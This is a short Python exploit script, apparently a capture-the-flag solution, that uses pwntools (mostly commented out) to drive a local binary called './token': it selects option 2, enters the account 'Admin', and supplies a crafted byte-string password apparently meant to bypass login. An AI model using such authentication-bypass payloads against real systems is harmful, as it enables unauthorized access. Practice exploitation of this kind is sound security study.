# from pwn import *

# r = process("./token")

# print(r.recvuntil("choice:"))
# r.sendline("2")
# print(r.recvuntil("account:"))
# r.sendline("Admin")
# print(r.recvuntil("password:"))
print("2")
print("Admin")
payload = "\x01\x02\x03\x04\x05\x061234560"
print(payload)
# r.sendline(payload)
# r.interactive()